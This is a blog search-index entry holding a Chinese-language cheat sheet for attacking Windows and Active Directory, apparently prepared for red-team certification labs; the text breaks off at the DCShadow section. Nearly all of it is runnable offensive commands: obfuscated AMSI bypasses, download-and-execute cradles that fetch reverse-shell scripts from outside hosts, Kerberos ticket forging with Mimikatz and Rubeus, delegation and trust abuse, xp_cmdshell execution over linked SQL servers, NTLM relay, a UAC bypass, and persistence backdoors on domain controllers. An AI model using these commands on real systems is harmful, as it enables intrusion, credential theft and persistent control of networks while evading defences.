<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows和Active Directory备忘单和命令参考]]></title>
    <url>%2F2021%2F05%2F19%2FWindows%E5%92%8CActive%20Directory%E5%A4%87%E5%BF%98%E5%8D%95%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83.html</url>
    <content type="text"><![CDATA[Windows和Active Directory备忘单和命令参考GeneralPowerShell AMSI Bypass修补AMSI将有助于绕过执行标记为恶意的PowerShell脚本（例如PowerView）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记flag。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。 ‘Plain’ AMSI bypass: 1[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) 用于复制粘贴的混淆示例： 1sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "&#123;1&#125;&#123;0&#125;"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "&#123;0&#125;&#123;2&#125;&#123;1&#125;" -f'amsi','d','InitFaile' ),( "&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( $&#123;n`ULl&#125;,$&#123;t`RuE&#125; ) 另一个旁路，PowerShell自动记录未检测到： 1[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) 更多绕过点击这里。对于混淆，请检查Invoke-Obfuscation，或在amsi.fail上获取预先生成的混淆版本。 PowerShell one-liners反射式加载PowerShell脚本代理感知： 1IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1') 不了解代理： 1$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText 同样，这可能会被标记flag。有关opsec安全的下载通讯座，请查看Invoke-CradleCrafter。 反射式加载C＃程序集在运行该类之前，请确保所引用的类和main方法为Public。请注意，为此可能需要全过程的AMSI旁路，有关详细信息，请参见此处。 12345678910111213141516# Download and run assembly without arguments$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')$assem = [System.Reflection.Assembly]::Load($data)[rev.Program]::Main("".Split())# Download and run Rubeus, with arguments$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')$assem = [System.Reflection.Assembly]::Load($data)[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())# Execute a specific method from an assembly (e.g. a DLL)$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')$assem = [System.Reflection.Assembly]::Load($data)$class = $assem.GetType("ClassLibrary1.Class1")$method = $class.GetMethod("runner")$method.Invoke(0, $null) 下载文件123456# Any version(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")# Powershell 4+## You can use 'IWR' as a shorthandInvoke-WebRequest "http://10.10.16.7/Incnspc64.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe" 编码命令编码一线： 123$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes) 或以上版本的Linux： 1echo 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0 对现有脚本进行编码，然后复制到剪贴板： 1[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip 运行它，绕过执行策略。 1Powershell -EncodedCommand $encodedCommand 如果您方便使用Nishang，则可以使用Invoke-Encode.ps1。 枚举使用PowerView进行AD枚举123456789101112131415161718192021222324252627282930313233343536373839404142434445# 获取当前域中的所有用户Get-NetUser | select -ExpandProperty cn# 获取当前域中的所有计算机Get-NetComputer# 获取当前林中的所有域Get-NetForestDomain# 获取域/林信任Get-NetDomainTrustGet-NetForestTrust# 获取DA组的信息Get-NetGroup -GroupName "Domain Admins"# 查找DA组的成员Get-NetGroupMember -GroupName "Domain Admins" | select -ExpandProperty membername# 在域中查找有趣的共享，忽略默认共享Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC# 获取当前域的OUGet-NetOU -FullData# 在OU中获取计算机# %&#123;&#125; 是循环语句Get-NetOU -OUName StudentMachines | %&#123;Get-NetComputer -ADSPath $_&#125;# 获取适用于特定OU的GPOGet-NetOU *student* | select gplinkGet-NetGPO -Name "&#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&#125;"# 获取通过GPO设置的受限组，查找通过域强制设置的有趣组成员身份Get-NetGPOGroup# 获取特定对象的传入ACLGet-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights# 查找整个域的有趣ACL，以可读（从左到右）格式显示Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?&#123;$_.IdentityReferenceName -NotContains "DnsAdmins"&#125; | ft# 获取特定用户或组的有趣的传出ACL# ?&#123;&#125; 是一个过滤器语句Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.IdentityReference -match "Domain Admins"&#125; | select ObjectDN,ActiveDirectoryRights AppLocker识别AppLocker策略。寻找免除的二进制文件或要绕过的路径。 1Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 一些高级绕过技术： 如果仅允许使用（Microsoft）签名的二进制文件，请使用LOLBAS。 如果C:\Windows允许来自的二进制文件，请尝试将您的二进制文件拖放到C:\Windows\Temp或C:\Windows\Tasks。如果此目录树中没有可写的子目录，但存在可写文件，则将文件写入备用数据流（例如JScript脚本），然后从那里执行它。 将您的二进制文件包装在DLL文件中，然后执行rundll32以绕过可执行规则。如果允许使用Python之类的二进制文件，请使用该文件。如果这不起作用，请尝试其他技术，例如将JScript包装在HTA文件中或使用来运行XSL文件wmic。 PowerShell受限语言模式有时，您可能会发现自己处于执行约束语言模式（CLM）的PowerShell会话中。与AppLocker配对时，通常是这种情况（请参见上文）。 您可以通过轮询以下变量来获取当前的语言模式，从而确定自己处于受限语言模式。FullLanguage对于无限制的会话和ConstrainedLanguageCLM ，它将说。还有其他语言模式，在这里我将不再赘述。 1$ExecutionContext.SessionState.LanguageMode CLM构成的约束将阻止您的许多利用尝试。一种快速而肮脏的绕过方法是使用内联函数，该函数有时会起作用-如果例如whoami被阻止，请尝试以下操作： 1&amp;&#123;whoami&#125; LAPS我们可以使用LAPSToolkit.ps1来识别域中的哪些计算机使用LAPS，以及允许哪些域组读取LAPS密码。如果属于此组，则也可以使用此工具获取当前的LAPS密码。 12345# 获取运行LAPS的计算机及其密码（如果允许我们读取这些密码）Get-LAPSComputers# 获取允许读取LAPS密码的组Find-LAPSDelegatedGroups ExploitationPowercat反向shell如果您的Linux机壳没有反向外壳，则可以选择;）。 1powercat -l -p 443 -t 9999 横向运动使用PowerView进行横向运动枚举1234567891011121314151617181920212223242526272829303132# 查找用户的现有本地管理员访问权限（noisy 🚩）Find-LocalAdminAccess# 通过PS远程处理（also noisy🚩）查找本地管理员访问权限，需要Find-PSRemotingLocalAdminAccess.ps1Get-NetComputer -Domain dollarcorp.moneycorp.local &gt; .\targets.txtFind-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355# 与WMI相同。是否需要“ Find-WMILocalAdminAccess.ps1”（似乎已从Nishang中删除了）？Find-WMILocalAdminAccess -ComputerFile .\targets.txtFind-WMILocalAdminAccess # Finds domain computers automatically# 在您可以访问的机器上搜寻有趣的用户会话 (still noisy 🚩)Invoke-UserHunter -CheckAccess | ?&#123;$_.LocalAdmin -Eq True &#125;# 寻找 kerberoastable usersGet-DomainUser -SPN | select name,serviceprincipalname# 寻找 AS-REP roastable usersGet-DomainUser -PreauthNotRequired | select name# 寻找可以设置UserAccountControl标志的用户## 如果可用-禁用预身份验证或添加SPN（请参见下文）Invoke-ACLScanner -ResolveGUIDs | ?&#123;$_.IdentityReferenceName -match "RDPUsers"&#125;# 查找启用了无限制委派的服务器## 如果可用，并且您在此服务器上具有管理员权限，请获取用户TGT（请参见下文）Get-DomainComputer -Unconstrained# 查找启用了约束委派的用户或计算机## 如果可用，并且您具有用户/计算机哈希，请以DA身份访问服务机（请参见下文）Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegatetoGet-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto BloodHound使用Invoke-BloodHoundfromSharpHound.ps1或use SharpHound.exe。两者都可以反思地运行，把它们放到这里。 12345# 如果您不关心OpSec，请运行所有检查🚩Invoke-BloodHound -CollectionMethod All,GPOLocalGroup# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts 🚩Invoke-BloodHound -CollectionMethod LoggedOn KerberoastingAutomatic使用PowerView： 1Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" 使用Hashcat破解哈希： 1hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule Manual123456789# 请求TGS进行kerberoastable帐户（SPN）Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"# 将TGS转储到磁盘Invoke-Mimikatz -Command '"kerberos::list /export"'# 使用TGSRepCrack破解python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi Targeted kerberoasting by setting SPN我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView： 1Set-DomainObject -Identity support355user -Set @&#123;serviceprincipalname='any/thing'&#125; AS-REP roasting获取可焙烤用户的哈希（有关搜索，请参见上文）。使用ASREPRoast.ps1： 1Get-ASREPHash -UserName VPN355user 使用Hashcat破解哈希： 1hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule 通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView。 1Set-DomainObject -Identity Control355User -XOR @&#123;useraccountcontrol=4194304&#125; Token Manipulation可以通过计算机上的会话/运行进程从其他用户模仿令牌。通过使用例如CobaltStrike注入到所述过程中可以实现类似的效果。 Incognito12345# 在机器上显示令牌.\incognito.exe list_tokens -u# 使用特定用户的令牌启动新过程.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe 如果您使用Meterpreter，则可以将内置的Incognito模块与一起使用，可以使用use incognito相同的命令。 Invoke-TokenManipulation1234567891011# 显示机器上的所有令牌Invoke-TokenManipulation -ShowAll# 仅在机器上显示唯一的，可用的令牌Invoke-TokenManipulation -Enumerate# 使用特定用户的令牌启动新过程Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"# 使用另一个进程的令牌启动新进程Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500 Mimikatz12345678# Overpass the hashsekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe# 黄金票据 (domain admin, w/ some ticket properties to avoid detection)kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# 白银票据 for a specific SPN with a compromised service / machine accountkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt 可在此处找到用于银票的可用SPN列表。这里提供了与攻击相关的SPN的另一个不错的概述。 使用schtasks执行命令需要“主机” SPN 创建任务： 12# 注意引号。如果引用变得很痛苦，请使用编码的命令。schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'" 触发它： 1schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local 使用WMI执行命令需要“主机”和“ RPCSS” SPN Windows1Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell.exe -e $encodedCommand" Linux12345# 使用passwordimpacket-wmiexec dcorp/student355:password@172.16.4.101# 使用hashimpacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54 使用PowerShell Remoting执行命令需要“ CIFS”，“ HTTP”和“ WSMAN” SPN 这个有点棘手。上述SPN的组合可能有效或无效-PowerShell也可能要求提供准确的FQDN。 123456789101112131415161718# 创建凭据以其他用户身份运行（如果需要，PTT不需要）# 如果不使用以下命令，请在以下命令中忽略-Credential $ Cred$SecPassword = ConvertTo-SecureString 'thePassword' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('CORP\username', $SecPassword)# 远程运行命令（可以一对多使用！）Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock &#123;whoami; hostname&#125;# 以其他用户身份启动会话（提示输入密码）Enter-PsSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator# 创建一个持久会话（将记住变量等），将脚本加载到该会话中，然后输入远程会话提示$sess = New-PsSession -Credential $CredInvoke-Command -Session $sess -FilePath c:\path\to\file.ps1Enter-PsSession -Session $sess# 在活动的PowerShell远程会话之间复制文件或从中复制文件Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination "C:\Users\dbprodadmin\documents\" 不受限制的委托可以在前端服务（例如IIS Web服务器）上设置，以允许它代表用户委派域中的任何服务（向后端服务（例如MSSQL数据库））。 DACL UAC属性： TrustedForDelegation. Exploitation在设置了无限制委派的服务器上具有管理特权时，我们可以为具有连接的其他用户转储TGT。使用Mimikatz： 12sekurlsa::tickets /exportkerberos::ptt c:\path\to\ticket.kirbi 或与Rubeus一起使用 123.\Rubeus.exe klist.\Rubeus.exe dump /luid:0x5379f2 /nowrap.\Rubeus.exe ptt /ticket:doIFSDCC[...] 如果该DC容易受到打印机错误的影响，我们还可以获得域控制器计算机帐户的哈希值。在具有无限制委派的服务器上，使用Rubeus监视新票证。 1.\Rubeus.exe monitor /interval:5 /nowrap 从攻击机上诱使域控制器使用打印机错误进行连接。从这里二进制。 1.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local DC的机器帐户的TGT应该在第一个会话中出现。我们可以传递此票证以获得DCSync特权。 1.\Rubeus.exe ptt /ticket:doIFxTCCBc... 约束委派可以在前端服务器（例如IIS）上设置约束委派，以允许它代表用户仅委派给选定的后端服务（例如MSSQL）。 DACL UAC属性：TrustedToAuthForDelegation。这允许s4u2self（即，仅使用NTLM密码哈希值）代表任何人自己请求TGS 。这有效地允许该服务仅使用他们的哈希来模拟域中的其他用户，并且在用户和前端之间不使用Kerberos的情况下非常有用。 DACL属性：msDS-AllowedToDelegateTo。此属性包含允许在其上使用的SPN s4u2proxy，即基于现有TGS（例如，从中使用所获得的TGS）请求该服务器的可转发TGS s4u2self。这有效地定义了允许委派委派的后端服务。 注意：这些属性不一定必须并存！如果s4u2proxy不允许使用s4u2self，则需要用户交互才能从用户获得有效的TGS到前端服务，类似于无约束委派。 Exploitation在这种情况下，我们使用Rubeus自动请求TGT，然后使用带有ldapSPN的TGS，以允许我们使用计算机帐户进行DCSync。 12345678# Get a TGT using the compromised service account with delegation set (if needed).\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt# Same as above, but access the LDAP service on the DC (for dcsync) using pw hash.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E 基于资源的约束委派基于资源的约束委派（RBCD）将后端服务器（例如MSSQL）配置为仅允许选定的前端服务（例如IIS）代表用户进行委派。这使特定的服务器管理员可以更轻松地配置委派，而无需域管理员权限。 DACL属性：msDS-AllowedToActOnBehalfOfOtherIdentity。 在这种情况下，s4u2self并且和s4u2proxy一样用于代表用户请求可转发票证。但是，使用RBCD，KDC会检查后端服务的属性中是否存在用于请求服务（即前端服务）的SPN 。这意味着前端服务需要设置SPN。因此，必须从具有SPN的服务帐户或计算机帐户对RBC进行攻击。msDS-AllowedToActOnBehalfOfOtherIdentity Exploitation如果我们损害出现在后端服务的RBCD属性中的前端服务，则利用与上面的受约束委派相同。但是，这不太常见。 更经常看到攻击RBCD是当我们有GenericWrite，GenericAll，WriteProperty，或WriteDACL许可在域中的计算机对象。这意味着我们可以msDS-AllowedToActOnBehalfOfOtherIdentity在该计算机帐户上写入属性，以添加受信任的SPN或计算机帐户以进行委派。我们甚至可以创建一个新的计算机帐户并添加它。就像上面的约束委派一样，这使我们可以在任何用户的上下文中破坏目标计算机。 1234567891011121314# Create a new machine account using PowerMadNew-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(ConvertTo-SecureString 'Compromised123!' -AsPlainText -Force)# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target$sid = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"$SDbytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDbytes,0)# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the targetGet-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @&#123;'msdsallowedtoactonbehalfofotheridentity'=$SDBytes&#125;# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target.\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:3644AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt 滥用域信任必须以DA特权运行。 使用域信任密钥从DC中，currentdomain\targetdomain$使用Mimikatz（例如，使用LSADump或DCSync）转储信任帐户的哈希。然后，使用此信任密钥和域SID，使用Mimikatz伪造一个跨域TGT，将目标域的企业管理员组的SID添加到我们的“ SID history”中。 1kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi 使用Rubeus. 确保您具有正确的Rubeus版本。由于某些原因，我的某些编译二进制文件给出了错误KDC_ERR_WRONG_REALM，而CRTP提供的版本可以正常工作。 1.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt 现在，我们可以DCSync目标域（请参见下文）。 使用krbtgt哈希F从DC中，使用DCSync或LSADump转储krbtgt哈希。然后，像以前的方法一样，使用此哈希，使用Mimikatz伪造一个跨域TGT。 使用SID历史（/sids的）*-516和S-1-5-9以伪装的域控制器组和企业域控制器分别是在日志中的噪声低。 1kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt 如果您在创建此票证时遇到问题，请尝试添加“ target”标志，例如/target:moneycorp.local. 或者，生成具有EA组的SID历史记录的域管理员票证。 1kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt 现在，我们可以立即DCSync目标域，或使用计划任务获取反向shell。 滥用林间信任由于林是安全边界，因此我们只能访问已与我们入侵的域（我们的源域）共享的域服务。使用例如BloodHound查找在两个林中都具有帐户（具有相同用户名）的用户，然后尝试重用密码。此外，我们可以使用PowerView来搜寻林之间的外部组成员身份。 1Get-DomainForeignGroupMember -domain corp2.com 在某些情况下，可能会在林之间禁用SID过滤（导致上述情况的保护）。如果您运行Get-DomainTrust并看到该TREAT_AS_EXTERNAL属性，便是这种情况！在这种情况下，如上所述，您可以像域信任一样滥用目录林信任。请注意，您仍然可以不伪造车票500和1000之间的任何SID的，所以你不能成为DA（甚至没有间接通过组继承）。在这种情况下，寻找在域控制器上授予本地管理员或类似非域特权的组。有关更多信息，请参阅此博客文章。 要模拟来自我们源域的用户以访问外部域中的服务，我们可以执行以下操作。如上述“使用域信任密钥”中那样提取林间信任密钥。 使用Mimikatz通过信任密钥为目标域生成TGT： 1Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi 然后，使用RubeusCIFS使用该TGT向TGS询问例如目标DC上的服务。 1.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt 现在，我们可以将目标林的DC上的CIFS服务用作源域的DA（同样，只要此信任关系已配置为存在）。 滥用MSSQL数据库进行横向移动可以链接MSSQL数据库，这样，如果您破坏了一个数据库，则可以在特定用户（sa也许是）的上下文中对其他数据库执行查询（甚至命令！）。这甚至可以跨森林工作！如果执行SQL，则可以使用以下命令枚举数据库链接。 12345678910-- 查找链接的服务器EXEC sp_linkedservers-- 在链接服务器上运行SQL查询select mylogin from openquery("dc01", 'select SYSTEM_USER as mylogin')-- 在远程服务器上启用“ xp_cmdshell”并执行命令EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT DC01EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT DC01EXEC ('xp_cmdshell ''whoami'' ') AT DC01 我们还可以使用PowerUpSQL在域中查找数据库，并收集有关（可达）数据库的更多信息。我们还可以自动在链接的数据库中查找并执行查询或命令（甚至通过多层数据库链接）。 12345678910111213141516171819202122232425# 获取域中的MSSQL数据库，并测试连通性Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft# 尝试获取所有域数据库上的信息Get-SQLInstanceDomain | Get-SQLServerInfo# 在单个可访问的数据库上获取信息Get-SQLServerInfo -Instance dcorp-mssql# 扫描MSSQL错误配置以升级到SAInvoke-SQLAudit -Verbose -Instance UFC-SQLDEV# 执行SQL查询Get-SQLQuery -Query "SELECT system_user" -Instance UFC-SQLDEV# 运行命令（需要启用XP_CMDSHELL）Invoke-SQLOSCmd -Instance devsrv -Command "whoami" | select -ExpandProperty CommandResults# 自动查找所有链接的数据库Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft# 如果在任何链接的数据库上启用了XP_CMDSHELL，则运行命令Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ftGet-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft 如果您具有对MSSQL数据库的低特权访问权限，并且不存在任何链接，则有可能通过使用xp_dirtree存储过程访问此共享来强制执行NTLM身份验证。如果成功，则可以收集SQL服务帐户的NetNTLM，并可能将其破解或中继，以破坏作为该服务帐户的计算机。 1EXEC master..xp_dirtree "\\192.168.49.67\share" 中继哈希以通过身份验证为本地admin的示例命令（如果服务帐户具有这些特权）并运行calc.exe。忽略该-c参数尝试尝试secretsdump。 1sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe' 特权提升有关更多信息（包括Windows和Linux），请参阅我的OSCP备忘单和命令参考。 PowerUp12345678910# 检查易受攻击的程序和配置Invoke-AllChecks# 利用易受攻击的服务权限（不需要触摸磁盘）Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net localgroup Administrators domain\user /add"# 利用易受攻击的服务权限触发稳定的beaconWrite-ServiceBinary -Name 'AbyssWebServer' -Command 'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update' -Path 'C:\WebServer\Abyss'net stop AbyssWebServernet start AbyssWebServer Bypass UAC使用SharpBypassUAC。 12345# 生成EncodedCommandecho -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64# 使用 SharpBypassUAC e.g. 从CobaltStrike 的一个beaconbeacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ== 在某些情况下，运行手动Bypass UAC （例如FODHelper bypass）可能会变得更好，而FODHelper旁路在PowerShell中执行起来非常简单。 1234567891011121314# The command to execute in high integrity context$cmd = "cmd /c start powershell.exe" # Set the registry valuesNew-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -ForceNew-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -ForceSet-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force # Trigger fodhelper to perform the bypassStart-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden # Clean registryStart-Sleep 3Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force Persistence启动文件夹只需删除一个二进制文件即可。经典😎🚩 在当前用户文件夹中，将在当前用户登录时触发： 1c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 或在启动文件夹中，需要管理特权，但在启动时以及任何用户登录时将以SYSTEM身份触发： 1C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 域持久性必须以DA特权运行。 Mimikatz万能钥匙攻击从DC运行。为所有用户🚩启用密码“ mimikatz”。 12privilege::debugmisc::skeleton 使用PowerView授予特定的用户DCSync权限随时为您提供用户选择的DCSync权限。在某些设置中可能会逃避检测。 1Add-ObjectACL -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student355 -Rights DCSync 域控制器DSRM管理员DSRM管理员是DC的本地管理员帐户。首先需要启用远程登录。 1New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD 现在，我们可以使用之前转储在DC上的本地管理哈希值远程登录（使用lsadump::sam，请参见下面的“使用Mimikatz转储秘密”）。使用例如“越过哈希”来获得会话（请参见上面的“ Mimikatz”）。 修改安全描述符以进行远程WMI访问使用Set-RemoteWMI.ps1cmdlet向用户WMI访问计算机。可以运行以持久访问例如DC。 1Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' 有关执行，请参见上面的“使用WMI执行命令”。 修改PowerShell远程访问的安全描述符使用Set-RemotePSRemoting.ps1cmdlet向用户PowerShell远程访问计算机。可以运行以持久访问例如DC。 1Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local 有关执行，请参见上面的“使用PowerShell Remoting执行命令”。 修改DC注册表安全描述符以使用DAMP进行远程哈希检索使用DAMP工具，我们就可以借壳DC注册表来给我们上的访问SAM，SYSTEM以及SECURITY注册表配置单元。这使我们能够远程转储DC机密（哈希）。 我们使用Add-RemoteRegBackdoor.ps1来自DAMP的cmdlet添加后门。 1Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355 使用RemoteHashRetrieval.ps1DAMP中的cmdlet远程转储秘密（以“受信任”用户身份运行）。 12345678# 获取针对银票攻击的机器帐户哈希Get-RemoteMachineAccountHash -ComputerName dcorp-dc# 获取本地帐户哈希Get-RemoteLocalAccountHash -ComputerName dcorp-dc# 获取缓存的凭据（如果有）Get-RemoteCachedCredential -ComputerName dcorp-dc DCShadowDCShadow是一种通过临时模仿域控制器来掩盖某些动作的攻击。如果您在根域中具有Domain Admin或Enterprise 